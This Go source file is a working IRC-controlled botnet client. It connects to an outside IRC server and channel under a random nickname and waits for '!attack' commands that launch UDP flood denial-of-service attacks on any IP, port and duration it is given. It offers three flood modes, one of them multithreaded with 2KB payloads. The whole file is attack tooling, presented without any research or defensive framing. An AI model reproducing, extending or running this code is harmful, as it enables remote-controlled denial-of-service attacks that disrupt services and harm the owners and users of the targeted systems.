package main

import (
	"crypto/tls"
	"log"
	"math/rand"
	"net"
	"strings"
	"time"

	"github.com/thoj/go-ircevent"
)

// generateRandomNickname generates a random nickname for the bot.
func generateRandomNickname() string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, 8)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func main() {
	// IRC server and channel details
	server := "irc.shells.org:9999"
	channel := "#anontoken"
	nickname := generateRandomNickname()

	irccon := irc.IRC(nickname, nickname)
	irccon.VerboseCallbackHandler = true
	irccon.UseTLS = true
	irccon.TLSConfig = &tls.Config{InsecureSkipVerify: true}

	// Join the channel when connected
	irccon.AddCallback("001", func(event *irc.Event) {
		irccon.Join(channel)
	})

	// Handle public messages
	irccon.AddCallback("PRIVMSG", func(event *irc.Event) {
		msg := event.Message()
		if strings.HasPrefix(msg, "!attack HEX") {
			params := strings.Split(msg, " ")
			if len(params) == 5 {
				ip := params[2]
				port := params[3]
				duration := params[4]
				attackHex(ip, port, duration)
			} else {
				irccon.Privmsg(channel, "Usage: !attack HEX <ip> <port> <duration>")
			}
		} else if strings.HasPrefix(msg, "!attack JUNK") {
			params := strings.Split(msg, " ")
			if len(params) == 5 {
				ip := params[2]
				port := params[3]
				duration := params[4]
				attackJunk(ip, port, duration)
			} else {
				irccon.Privmsg(channel, "Usage: !attack JUNK <ip> <port> <duration>")
			}
		} else if strings.HasPrefix(msg, "!attack UDPFLOOD") {
			params := strings.Split(msg, " ")
			if len(params) == 5 {
				ip := params[2]
				port := params[3]
				duration := params[4]
				attackUDPFlood(ip, port, duration)
			} else {
				irccon.Privmsg(channel, "Usage: !attack UDPFLOOD <ip> <port> <duration>")
			}
		}
	})

	// Connect to the IRC server
	err := irccon.Connect(server)
	if err != nil {
		log.Fatalf("Failed to connect: %s", err)
	}

	irccon.Loop()
}

// attackHex sends a specific hex payload to the target IP and port for the given duration.
func attackHex(ip string, port string, duration string) {
	dur, _ := time.ParseDuration(duration + "s")
	endTime := time.Now().Add(dur)
	payload := []byte{0x55, 0x55, 0x55, 0x55, 0x00, 0x00, 0x00, 0x01}

	for time.Now().Before(endTime) {
		conn, _ := net.Dial("udp", ip+":"+port)
		conn.Write(payload)
		conn.Close()
	}
}

// attackJunk sends a junk payload to the target IP and port for the given duration.
func attackJunk(ip string, port string, duration string) {
	dur, _ := time.ParseDuration(duration + "s")
	endTime := time.Now().Add(dur)
	payload := make([]byte, 64)

	for time.Now().Before(endTime) {
		conn, _ := net.Dial("udp", ip+":"+port)
		conn.Write(payload)
		conn.Close()
	}
}

// attackUDPFlood performs a UDP flood attack on the target IP and port for the given duration.
func attackUDPFlood(ip string, port string, duration string) {
	dur, _ := time.ParseDuration(duration + "s")
	endTime := time.Now().Add(dur)
	const maxThreads = 10

	type UDPFlood struct {
		host       string
		port       string
		timeout    time.Duration
		totalSent  *int
	}

	var threads []*UDPFlood

	for i := 0; i < maxThreads; i++ {
		threads = append(threads, &UDPFlood{
			host: ip,
			port: port,
			timeout: dur,
			totalSent: new(int),
		})
	}

	for _, thread := range threads {
		go func(t *UDPFlood) {
			payload := strings.Repeat("A", 2048) // 2KB payload
			for time.Now().Before(endTime) {
				conn, _ := net.Dial("udp", t.host+":"+t.port)
				conn.Write([]byte(payload))
				*(t.totalSent) += len(payload)
				conn.Close()
			}
		}(thread)
	}

	time.Sleep(dur)
}
